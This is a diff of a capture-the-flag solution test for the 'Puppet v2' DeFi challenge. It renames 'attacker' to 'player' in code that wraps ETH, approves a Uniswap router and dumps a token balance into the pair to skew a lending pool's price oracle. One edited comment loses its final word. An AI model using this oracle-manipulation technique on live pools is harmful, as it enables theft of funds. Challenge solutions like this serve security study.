@@ -99,22 +99,22 @@ describe('[Challenge] Puppet v2', function () {
 
 
         getBalance = ethers.provider.getBalance
-        lp = this.lendingPool.connect(attacker);
-        token = this.token.connect(attacker);
-        weth = this.weth.connect(attacker);
-        uniSwapExchange = this.uniswapExchange.connect(attacker); // pair
-        uniSwapRouter = this.uniswapRouter.connect(attacker);
+        lp = lendingPool.connect(player);
+        token = token.connect(player);
+        weth = weth.connect(player);
+        uniSwapExchange = uniswapExchange.connect(player); // pair
+        uniSwapRouter = uniswapRouter.connect(player);
         
         // Check our current status
-        let currentTokens = await token.balanceOf(attacker.address); 
-        let currentWeth = await weth.balanceOf(attacker.address);
-        let currentEth = await getBalance(attacker.address);
+        let currentTokens = await token.balanceOf(player.address); 
+        let currentWeth = await weth.balanceOf(player.address);
+        let currentEth = await getBalance(player.address);
 
         async function info() {
             // Check our current status again. 
-            currentTokens = await token.balanceOf(attacker.address); 
-            currentWeth = await weth.balanceOf(attacker.address);
-            currentEth = await getBalance(attacker.address);
+            currentTokens = await token.balanceOf(player.address); 
+            currentWeth = await weth.balanceOf(player.address);
+            currentEth = await getBalance(player.address);
             console.log(`\n## INFO ##`)
             console.log(`# Your current balance is: ${formatEther(currentTokens)} DVT, ${formatEther(currentWeth)} WETH and ${formatEther(currentEth)} ETH`);
 
@@ -135,8 +135,8 @@ describe('[Challenge] Puppet v2', function () {
         // Let's swap our ETH for WETH.
         await weth.deposit({value: parseEther("19.8")});
 
-        await token.approve(uniSwapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
-        await weth.approve(uniSwapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await token.approve(uniSwapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await weth.approve(uniSwapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
 
         // function swapExactTokensForTokens(
         //     uint amountIn,
@@ -146,8 +146,8 @@ describe('[Challenge] Puppet v2', function () {
         //     uint deadline
         //   ) external returns (uint[] memory amounts);
 
-        // Let's swap them. Since we have more of the asset that can change drastically the value, start with this.
-        await uniSwapRouter.swapExactTokensForTokens(ATTACKER_INITIAL_TOKEN_BALANCE, 0, [token.address, weth.address], attacker.address, deadline());
+        // Let's swap them. Since we have more of the asset that can change drastically the value, start with 
+        await uniSwapRouter.swapExactTokensForTokens(PLAYER_INITIAL_TOKEN_BALANCE, 0, [token.address, weth.address], player.address, deadline());
 
         await info();
 
